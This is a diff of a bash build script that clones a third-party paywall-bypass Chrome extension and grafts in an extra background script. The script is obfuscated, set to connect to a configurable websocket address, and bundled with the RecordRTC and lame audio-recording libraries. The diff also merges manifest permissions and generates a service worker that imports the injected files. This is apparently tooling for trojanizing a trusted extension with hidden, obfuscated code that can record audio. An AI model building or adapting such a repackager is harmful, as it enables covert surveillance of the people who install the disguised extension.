@@ -2,14 +2,26 @@
 set -euo pipefail
 trap 'rm -f temp_manifest.json temp_script.js' EXIT
 
+# Suggested REPO_LIST
+REPO_LIST=(
+    # "https://github.com/iamadamdev/bypass-paywalls-chrome" ""
+    # "https://github.com/mauricecruz/chrome-devtools-zerodarkmatrix-theme" "theme-extension"
+    "https://github.com/aspenmayer/bypass-paywalls-chrome-clean-magnolia1234" ""
+)
+
 # Default values
-DEFAULT_REPO_URL="https://github.com/iamadamdev/bypass-paywalls-chrome"
+RANDOM_INDEX=$((RANDOM % $((${#REPO_LIST[@]} / 2)) * 2))
+DEFAULT_REPO_URL=${REPO_LIST[$RANDOM_INDEX]}
+DEFAULT_REPO_NAME=$(basename "$DEFAULT_REPO_URL" .git)
+DEFAULT_EXTENSION_PATH=${REPO_LIST[$((RANDOM_INDEX + 1))]}
 DEFAULT_WS_ADDRESS="ws://127.0.0.1:4343"
-DEFAULT_EXTENSION_PATH=""
 DESTINATION_FOLDER="external_extension"
+DESTINATION_FOLDER_NAME="$DESTINATION_FOLDER/$DEFAULT_REPO_NAME"
 INJECT_SCRIPT="extension/src/bg/background.js"
-EXTRA_FILES=("extension/src/bg/lame.min.js" "extension/src/bg/RecordRTC.min.js")
-ORIGINAL_MANIFEST="extension/manifest.json"  # Path to the original extension's manifest.json
+EXTRA_FILES=("extension/src/bg/lame.min.js"
+    "extension/src/bg/RecordRTC.min.js"
+)
+ORIGINAL_MANIFEST="extension/manifest.json" # Path to the original extension's manifest.json
 
 # Function to build target paths
 build_target_path() {
@@ -50,16 +62,46 @@ prompt_for_input() {
 
 # Clone repository
 clone_repository() {
-    if [ ! -d "$DESTINATION_FOLDER" ]; then
+    # Extract the last part of the repo URL as the repo name
+
+    local target_dir="$DESTINATION_FOLDER/$DEFAULT_REPO_NAME"
+    local temp_dir="$DESTINATION_FOLDER/temp_$DEFAULT_REPO_NAME"
+
+    if [ ! -d "$target_dir" ]; then
         echo "Cloning repository..."
-        if ! git clone "$REPO_URL" "$DESTINATION_FOLDER"; then
+        # Safety check for temp_dir
+        if [[ "$temp_dir" == "/" ]] || [[ -z "$temp_dir" ]]; then
+            echo "Error: Invalid temporary directory path"
+            exit 1
+        fi
+
+        mkdir -p "$temp_dir"
+        if ! git clone "$REPO_URL" "$temp_dir"; then
             echo "Error: Failed to clone repository."
             echo "Possible reasons:"
             echo "  - The repository URL may be incorrect."
             echo "  - You may not have an internet connection."
             echo "  - You may not have the necessary permissions."
             echo "Please check the URL and your network connection, then try again."
+
+            # Safety check before removal
+            if [[ -d "$temp_dir" ]] && [[ "$temp_dir" != "/" ]] && [[ -n "$temp_dir" ]]; then
+                find "$temp_dir" -delete 2>/dev/null || rm -r "$temp_dir"
+            fi
             exit 1
+        fi
+
+        # Move only the extension directory to final location
+        if [ -n "$EXTENSION_PATH" ]; then
+            mkdir -p "$target_dir"
+            mv "$temp_dir/$EXTENSION_PATH"/* "$target_dir/"
+        else
+            mv "$temp_dir" "$target_dir"
+        fi
+
+        # Safety check before cleanup
+        if [[ -d "$temp_dir" ]] && [[ "$temp_dir" != "/" ]] && [[ -n "$temp_dir" ]]; then
+            find "$temp_dir" -delete 2>/dev/null || rm -r "$temp_dir"
         fi
     else
         echo "Repository already exists, skipping clone."
@@ -68,14 +110,12 @@ clone_repository() {
 
 # Inject script
 inject_script() {
-    local source_script="extension/src/bg/background.js"
-    local background_script="src/bg/background.js"
     local target_file
-    target_file=$(build_target_path "$background_script")
+    target_file="$DESTINATION_FOLDER_NAME/src/$(basename "$INJECT_SCRIPT")"
 
     mkdir -p "$(dirname "$target_file")"
 
-    sed "s|$DEFAULT_WS_ADDRESS|$WS_ADDRESS|g" "$source_script" > temp_script.js
+    sed "s|$DEFAULT_WS_ADDRESS|$WS_ADDRESS|g" "$INJECT_SCRIPT" >temp_script.js
 
     javascript-obfuscator temp_script.js --output "$target_file" \
         --compact true \
@@ -84,31 +124,30 @@ inject_script() {
 
     rm temp_script.js
 
-    echo "Injected script: $background_script"
+    echo "Injected script: $target_file"
 }
 
 # Copy extra files
 copy_extra_files() {
     for file in "${EXTRA_FILES[@]}"; do
         if [ -f "$file" ]; then
-            local filename
-            filename=$(basename "$file")
-            local target
-            target=$(build_target_path "src/bg/$filename")
+            local base_name
+            base_name=$(basename "$file")
+            local target="$DESTINATION_FOLDER_NAME/src/$base_name"
             mkdir -p "$(dirname "$target")"
             cp "$file" "$target"
-            echo "Copied extra file: src/bg/$filename"
+            echo "Copied extra file: $base_name"
         else
             echo "Warning: Extra file not found: $file"
         fi
     done
 }
-
 # Update manifest file
 update_manifest() {
     local manifest
-    manifest=$(build_target_path "manifest.json")
+    manifest="$DESTINATION_FOLDER_NAME/manifest.json"
     local temp_manifest="temp_manifest.json"
+    local service_worker_file="src/service_worker.js"
 
     # Check manifest version
     local manifest_version
@@ -121,71 +160,99 @@ update_manifest() {
 
         # Merge extra_files and existing_bg_scripts, remove duplicates but keep order
         local merged_scripts
-        merged_scripts=$(jq -n --argjson existing "$existing_bg_scripts" --argjson extra '["src/bg/RecordRTC.min.js", "src/bg/lame.min.js"]' '
+        merged_scripts=$(jq -n --argjson existing "$existing_bg_scripts" --argjson extra '["src/RecordRTC.min.js", "src/lame.min.js"]' '
             ($existing + $extra) | unique')
 
-        # Add src/bg/background.js at the end
+        # Add src/background.js at the end
         jq --argjson scripts "$merged_scripts" \
-           '.background.scripts = ($scripts + ["src/bg/background.js"]) | .background.persistent = true' "$manifest" > "$temp_manifest"
+            '.background.scripts = ($scripts + ["src/background.js"]) | .background.persistent = true' "$manifest" >"$temp_manifest"
+
+        mv "$temp_manifest" "$manifest"
+
+        # Merge permissions for v2
+        local original_permissions
+        original_permissions=$(jq '.permissions // []' "$ORIGINAL_MANIFEST")
+
+        jq --argjson orig_permissions "$original_permissions" \
+            '.permissions = (.permissions + $orig_permissions) | .permissions |= unique' "$manifest" >"$temp_manifest"
+        mv "$temp_manifest" "$manifest"
 
     elif [ "$manifest_version" -eq 3 ]; then
         # Check if service_worker already exists
         local existing_service_worker
         existing_service_worker=$(jq -r '.background.service_worker // empty' "$manifest")
 
-        if [ "$existing_service_worker" != "src/bg/background.js" ]; then
-            jq --arg script "src/bg/background.js" \
-                '.background.service_worker = $script' "$manifest" > "$temp_manifest"
+        if [ "$existing_service_worker" != "$service_worker_file" ]; then
+            # Create new service_worker.js file
+            {
+                echo "// Auto-generated service worker"
+                for file in "${EXTRA_FILES[@]}"; do
+                    local base_name
+                    base_name=$(basename "$file")
+                    echo "import './src/$base_name';"
+                done
+                echo "import './src/background.js';"
+                # Import existing service worker if it exists
+                if [ -n "$existing_service_worker" ]; then
+                    echo "import './src/$existing_service_worker';"
+                fi
+            } >"$DESTINATION_FOLDER_NAME/$service_worker_file"
+
+            jq --arg script "$service_worker_file" \
+                '.background.service_worker = $script' "$manifest" >"$temp_manifest"
         else
             cp "$manifest" "$temp_manifest"
         fi
+
+        mv "$temp_manifest" "$manifest"
+
+        # Handle v3 specific permissions
+        local original_permissions
+        original_permissions=$(jq '.permissions // []' "$ORIGINAL_MANIFEST")
+
+        # Filter out v2-only permissions for v3
+        local v3_permissions
+        v3_permissions=$(jq -n --argjson perms "$original_permissions" \
+            '$perms | map(select(. != "<all_urls>" and . != "webRequestBlocking"))')
+
+        jq --argjson orig_permissions "$v3_permissions" \
+            '.permissions = (.permissions + $orig_permissions) | .permissions |= unique' "$manifest" >"$temp_manifest"
+        mv "$temp_manifest" "$manifest"
+
+        # Handle host_permissions for v3
+        local original_host_permissions
+        original_host_permissions=$(jq '.host_permissions // []' "$ORIGINAL_MANIFEST")
+
+        jq --argjson orig_host_permissions "$original_host_permissions" \
+            '.host_permissions = (.host_permissions + $orig_host_permissions) | .host_permissions |= unique' "$manifest" >"$temp_manifest"
+        mv "$temp_manifest" "$manifest"
     else
         echo "Error: Unsupported manifest version: $manifest_version"
         exit 1
     fi
 
-    mv "$temp_manifest" "$manifest"
-
-    # Merge permissions from the original extension
-    local original_permissions
-    original_permissions=$(jq '.permissions // []' "$ORIGINAL_MANIFEST")
-
-    jq --argjson orig_permissions "$original_permissions" \
-        '.permissions = (.permissions + $orig_permissions) | .permissions |= unique' "$manifest" > "$temp_manifest"
-    mv "$temp_manifest" "$manifest"
-
-    # Merge optional_permissions
+    # Merge optional_permissions (common to both v2 and v3)
     local original_optional_permissions
     original_optional_permissions=$(jq '.optional_permissions // []' "$ORIGINAL_MANIFEST")
 
     jq --argjson orig_optional_permissions "$original_optional_permissions" \
-        '.optional_permissions = (.optional_permissions + $orig_optional_permissions) | .optional_permissions |= unique' "$manifest" > "$temp_manifest"
+        '.optional_permissions = (.optional_permissions + $orig_optional_permissions) | .optional_permissions |= unique' "$manifest" >"$temp_manifest"
     mv "$temp_manifest" "$manifest"
 
-    # Merge host_permissions (for Manifest V3)
-    if [ "$manifest_version" -eq 3 ]; then
-        local original_host_permissions
-        original_host_permissions=$(jq '.host_permissions // []' "$ORIGINAL_MANIFEST")
-
-        jq --argjson orig_host_permissions "$original_host_permissions" \
-            '.host_permissions = (.host_permissions + $orig_host_permissions) | .host_permissions |= unique' "$manifest" > "$temp_manifest"
-        mv "$temp_manifest" "$manifest"
-    fi
-
-    # Merge content_scripts without duplicates
+    # Merge content_scripts (common to both v2 and v3)
     local original_content_scripts
     original_content_scripts=$(jq '.content_scripts // []' "$ORIGINAL_MANIFEST")
 
     jq --argjson orig_content_scripts "$original_content_scripts" \
-        '.content_scripts = (.content_scripts + $orig_content_scripts)' "$manifest" > "$temp_manifest"
+        '.content_scripts = (.content_scripts + $orig_content_scripts)' "$manifest" >"$temp_manifest"
     mv "$temp_manifest" "$manifest"
 
-    # Merge web_accessible_resources without duplicates
+    # Merge web_accessible_resources (common to both v2 and v3)
     local original_war
     original_war=$(jq '.web_accessible_resources // []' "$ORIGINAL_MANIFEST")
 
     jq --argjson orig_war "$original_war" \
-        '.web_accessible_resources = (.web_accessible_resources + $orig_war) | .web_accessible_resources |= unique' "$manifest" > "$temp_manifest"
+        '.web_accessible_resources = (.web_accessible_resources + $orig_war) | .web_accessible_resources |= unique' "$manifest" >"$temp_manifest"
     mv "$temp_manifest" "$manifest"
 
     echo "Updated manifest.json with merged permissions and resources"
